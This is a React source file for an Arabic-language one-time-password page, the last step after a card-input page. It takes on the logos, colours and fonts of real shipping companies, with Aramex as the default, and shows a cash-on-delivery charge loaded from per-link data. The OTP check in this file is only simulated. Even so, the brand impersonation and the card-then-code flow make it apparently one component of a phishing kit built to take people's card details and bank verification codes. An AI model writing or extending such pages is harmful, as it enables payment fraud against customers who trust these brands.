import { useState } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { getServiceBranding } from "@/lib/serviceLogos";
import { useLink } from "@/hooks/useSupabase";
import { getCompanyById } from "@/lib/shippingCompanies";
import { Shield, ArrowLeft, RotateCcw } from "lucide-react";

const PaymentOTPOfficial = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { data: linkData } = useLink(id);

  const serviceKey = linkData?.payload?.service_key || 'aramex';
  const serviceName = linkData?.payload?.service_name || serviceKey;
  const branding = getServiceBranding(serviceKey);
  const shippingInfo = linkData?.payload as any;

  const [otp, setOtp] = useState("");
  const [error, setError] = useState("");
  const [isVerifying, setIsVerifying] = useState(false);

  // Get amount from shipping info
  const rawAmount = shippingInfo?.cod_amount || 500;
  const amount = typeof rawAmount === 'string' ? parseFloat(rawAmount) : rawAmount;

  const handleVerify = async (e: React.FormEvent) => {
    e.preventDefault();
    setError("");
    setIsVerifying(true);

    // Simulate OTP verification
    setTimeout(() => {
      if (otp === "123456") {
        navigate(`/pay/${id}/receipt`);
      } else {
        setError("رمز التحقق غير صحيح. يرجى المحاولة مرة أخرى.");
      }
      setIsVerifying(false);
    }, 1500);
  };

  const handleResend = () => {
    alert("تم إرسال رمز جديد إلى رقم هاتفك");
  };

  const handleBack = () => {
    navigate(`/pay/${id}/card-input`);
  };

  // Get company data and styling
  const company = getCompanyById(serviceKey);
  const getCompanyStyles = () => {
    if (!company) {
      // Fallback styles
      return {
        gradient: 'linear-gradient(135deg, #E31E24, #FF6B35)',
        background: 'linear-gradient(180deg, #FFF 0%, #FFF5F5 100%)',
        cardBg: '#FFFFFF',
        primaryText: '#1A1A1A',
        secondaryText: '#6B6B6B',
        logo: '/logos/aramex-logo.svg',
        fontFamily: "'Cairo', 'Tajawal', sans-serif",
        headerBg: '#FFFFFF',
        borderColor: '#E0E0E0',
        buttonShadow: '0 4px 12px rgba(227, 30, 36, 0.25)',
        inputFocus: '#E31E24',
      };
    }

    return {
      gradient: company.colors.gradient,
      background: company.colors.background,
      cardBg: '#FFFFFF',
      primaryText: '#1A1A1A',
      secondaryText: '#6B6B6B',
      logo: company.logo,
      fontFamily: company.fontFamily,
      headerBg: '#FFFFFF',
      borderColor: '#E0E0E0',
      buttonShadow: `0 4px 12px ${company.colors.primary}40`,
      inputFocus: company.colors.primary,
    };
  };

  const companyStyles = getCompanyStyles();

  return (
    <div
      className="min-h-screen"
      style={{
        background: companyStyles.background,
        fontFamily: companyStyles.fontFamily,
      }}
    >
      {/* Official Company Header */}
      <header
        className="sticky top-0 z-50 w-full border-b"
        style={{
          backgroundColor: companyStyles.headerBg,
          borderBottomColor: companyStyles.borderColor,
          boxShadow: '0 2px 8px rgba(0,0,0,0.05)',
        }}
      >
        <div className="container mx-auto px-4 h-16 sm:h-20 flex items-center justify-between">
          <div className="flex items-center gap-3 sm:gap-4">
            <button onClick={handleBack} className="p-2 hover:bg-gray-100 rounded-full transition-colors">
              <ArrowLeft className="w-5 h-5" style={{ color: companyStyles.primaryText }} />
            </button>
            <img
              src={companyStyles.logo}
              alt={serviceName}
              className="h-8 sm:h-12 w-auto object-contain"
            />
          </div>
          <div className="text-right">
            <h1 className="text-lg sm:text-xl font-bold" style={{ color: companyStyles.primaryText }}>
              {serviceName}
            </h1>
            <p className="text-xs sm:text-sm" style={{ color: companyStyles.secondaryText }}>
              التحقق من الهوية
            </p>
          </div>
        </div>
        {/* Brand Bar */}
        <div
          className="h-1 w-full"
          style={{
            background: companyStyles.gradient,
          }}
        />
      </header>

      {/* Main Content */}
      <main className="container mx-auto px-4 py-6 sm:py-8">
        <div className="max-w-2xl mx-auto">
          {/* Progress Indicator */}
          <div
            className="mb-6 sm:mb-8 p-4 sm:p-6 rounded-lg border"
            style={{
              backgroundColor: companyStyles.cardBg,
              borderColor: companyStyles.borderColor,
            }}
          >
            <div className="flex items-center justify-between mb-3">
              <span
                className="text-sm font-semibold"
                style={{ color: companyStyles.primaryText }}
              >
                الخطوة 4 من 4
              </span>
              <span
                className="text-xs"
                style={{ color: companyStyles.secondaryText }}
              >
                {serviceName}
              </span>
            </div>
            <div className="w-full h-2 bg-gray-200 rounded-full overflow-hidden">
              <div
                className="h-full rounded-full transition-all duration-500"
                style={{
                  width: '100%',
                  background: companyStyles.gradient,
                }}
              />
            </div>
          </div>

          {/* OTP Form */}
          <form onSubmit={handleVerify}>
            <div
              className="border rounded-xl p-6 sm:p-8 mb-6"
              style={{
                backgroundColor: companyStyles.cardBg,
                borderColor: companyStyles.borderColor,
                boxShadow: '0 4px 12px rgba(0,0,0,0.08)',
              }}
            >
              <h2
                className="text-xl font-bold mb-2 text-center"
                style={{ color: companyStyles.primaryText }}
              >
                أدخل رمز التحقق
              </h2>
              <p
                className="text-sm mb-6 text-center"
                style={{ color: companyStyles.secondaryText }}
              >
                تم إرسال رمز التحقق إلى رقم هاتفك
              </p>

              <div className="space-y-6">
                {/* OTP Input */}
                <div>
                  <label
                    className="block text-sm font-semibold mb-3 text-center"
                    style={{ color: companyStyles.primaryText }}
                  >
                    رمز التحقق (OTP)
                  </label>
                  <div className="relative max-w-md mx-auto">
                    <input
                      type="text"
                      placeholder="123456"
                      value={otp}
                      onChange={(e) => setOtp(e.target.value.replace(/[^0-9]/g, ""))}
                      maxLength={6}
                      className="w-full px-6 py-4 border-2 rounded-lg text-lg text-center font-bold tracking-[0.5em] transition-all focus:outline-none focus:ring-2"
                      style={{
                        borderColor: error ? '#E31837' : branding.colors.primary,
                        fontFamily: companyStyles.fontFamily,
                        '--tw-ring-color': companyStyles.inputFocus,
                      } as React.CSSProperties}
                    />
                    <Shield
                      className="absolute left-3 top-1/2 -translate-y-1/2 w-5 h-5"
                      style={{ color: companyStyles.secondaryText }}
                    />
                  </div>
                  {error && (
                    <p className="text-sm mt-3 text-center" style={{ color: '#E31837' }}>
                      {error}
                    </p>
                  )}
                </div>

                {/* Security Info */}
                <div
                  className="flex items-start gap-3 p-4 rounded-lg border"
                  style={{
                    backgroundColor: `${branding.colors.primary}08`,
                    borderColor: `${branding.colors.primary}30`,
                  }}
                >
                  <Shield className="w-5 h-5 flex-shrink-0 mt-0.5" style={{ color: branding.colors.primary }} />
                  <div>
                    <div
                      className="font-semibold text-sm mb-1"
                      style={{ color: companyStyles.primaryText }}
                    >
                      أمان إضافي
                    </div>
                    <div className="text-xs" style={{ color: companyStyles.secondaryText }}>
                      رمز التحقق صالح لمدة 5 دقائق فقط. لا تشارك هذا الرمز مع أي شخص.
                    </div>
                  </div>
                </div>
              </div>
            </div>

            {/* Verify Button */}
            <button
              type="submit"
              disabled={otp.length !== 6 || isVerifying}
              className="w-full text-white font-bold py-4 sm:py-5 px-6 rounded-lg transition-all duration-300 hover:shadow-lg active:scale-[0.98] flex items-center justify-center gap-2 text-sm sm:text-base disabled:opacity-50 disabled:cursor-not-allowed disabled:hover:scale-100"
              style={{
                background: companyStyles.gradient,
                boxShadow: companyStyles.buttonShadow,
                fontFamily: companyStyles.fontFamily,
              }}
            >
              {isVerifying ? (
                <>
                  <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin" />
                  <span>جارٍ التحقق...</span>
                </>
              ) : (
                <>
                  <Shield className="w-5 h-5" />
                  <span>تأكيد الرمز</span>
                </>
              )}
            </button>

            {/* Resend OTP */}
            <div className="text-center mt-6">
              <button
                type="button"
                onClick={handleResend}
                className="inline-flex items-center gap-2 px-4 py-2 rounded-lg border transition-all hover:bg-gray-50 text-sm font-semibold"
                style={{
                  color: branding.colors.primary,
                  borderColor: branding.colors.primary,
                  fontFamily: companyStyles.fontFamily,
                }}
              >
                <RotateCcw className="w-4 h-4" />
                إعادة إرسال الرمز
              </button>
            </div>
          </form>
        </div>
      </main>
    </div>
  );
};

export default PaymentOTPOfficial;
